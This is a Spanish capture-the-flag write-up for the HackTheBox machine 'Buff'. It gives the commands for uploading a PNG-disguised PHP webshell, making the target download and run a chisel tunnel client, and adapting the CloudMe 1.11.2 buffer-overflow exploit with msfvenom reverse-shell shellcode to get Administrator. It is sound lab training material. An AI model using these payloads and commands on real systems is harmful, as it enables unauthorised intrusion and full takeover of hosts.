// 01

Resumen

Resumen. Solo el 8080: un Apache con PHP sirviendo una web de gimnasio (Gym Management System 1.0). El upload.php no exige autenticación y valida la extensión de forma ingenua: con un doble .php.png y los *magic bytes* de PNG se sube un .php ejecutable a /upload/ → webshell como buff\shaun y la user flag. Dentro, netstat muestra CloudMe 1.11.2 escuchando solo en 127.0.0.1:8888, y el instalador está en Downloads. Con un túnel (chisel) se trae el puerto a Kali y se lanza el buffer overflow de EDB 48389 cambiando la shellcode por una reverse shell → shell como Administrator y la root flag.

// NOTA

Versión simplificada (la usada): dos endpoints (subida + ejecución) y un PoC con tres números fijos. Lo único con "montaje" es el túnel, porque el servicio sólo escucha en localhost.

// 04

Foothold: subida de webshell

SHELL
# PNG mágico + doble extensión; el parámetro id decide el nombre final
$ printf '\x89\x50\x4e\x47\x0d\x0a\x1a\n<?php echo shell_exec($_REQUEST["cmd"]); ?>' > /tmp/pwn.php.png
$ curl -s -X POST "http://10.129.2.18:8080/upload.php?id=pwn" \
$ -F 'pupload=upload' -F 'file=@/tmp/pwn.php.png'
$ curl -s "http://10.129.2.18:8080/upload/pwn.php" --data-urlencode 'cmd=whoami'

Lo que se encontró: buff\shaun, y la user flag:

SHELL
$ curl -s "http://10.129.2.18:8080/upload/pwn.php" --data-urlencode 'cmd=type C:\Users\shaun\Desktop\user.txt'
# [flag oculta]

Por qué funciona: upload.php comprueba $_FILES['file']['type']/la extensión de forma superficial; pwn.php.png se guarda y se sirve como pwn.php en /upload/. El PNG mágico (\x89PNG...) ayuda a pasar las comprobaciones.

Túnel al 8888

SHELL
# Kali: descargar chisel (linux + windows), servir el .exe y arrancar el servidor
$ curl -sL -o chisel.exe.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
$ curl -sL -o chisel.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
$ gunzip -f chisel.exe.gz chisel.gz && chmod +x chisel
$ python3 -m http.server 8000 --bind 10.10.16.12 &
$ ./chisel server -p 9002 --reverse &
SHELL
# en el target, via webshell: descargar y arrancar el cliente en segundo plano
$ curl -s ".../upload/pwn.php" --data-urlencode 'cmd=powershell -nop -c "iwr http://10.10.16.12:8000/c.exe -OutFile C:\xampp\htdocs\gym\upload\c.exe"'
$ curl -s ".../upload/pwn.php" --data-urlencode 'cmd=powershell -nop -c "Start-Process C:\xampp\htdocs\gym\upload\c.exe -ArgumentList \"client\",\"10.10.16.12:9002\",\"R:8888:127.0.0.1:8888\" -WindowStyle Hidden"'

Lo que se encontró: el servidor de chisel registra session#1: tun: proxy#R:8888=>8888: Listening y en Kali aparece *:8888 LISTEN.

// 07

Buffer overflow de CloudMe

SHELL
$ searchsploit -m 48389 # -> 48389.py (PoC)
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.12 LPORT=4444 -a x86 \
$ --platform windows -b '\x00\x0a\x0d' -f raw -o sc.bin

El PoC sólo hay que cambiarle la shellcode (deja el resto igual):

padding = b"\x90" * 1052
eip = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> push esp ; ret
nops = b"\x90" * 30
payload = open("sc.bin", "rb").read()
buf = padding + eip + nops + payload
buf += b"C" * (1500 - len(buf)) # relleno hasta 1500
SHELL
$ nc -lvnp 4444 &
$ python3 bof.py

Lo que se encontró: shell como buff\administrator (CloudMe corre como Administrador) y la root flag:

SHELL
$ C:\Windows\system32>whoami
$ buff\administrator
$ C:\Windows\system32>powershell -c "Get-Content C:\Users\Administrator\Desktop\root.txt"
$ [flag oculta]

Por qué funciona: CloudMe 1.11.2 copia el buffer de login sin comprobar longitud; 1052 bytes llegan a EIP, que salta a ESP (push esp; ret), donde están los 30 NOPs y la shellcode. Es un BoF de pila clásico en un servicio que corre como Administrador.
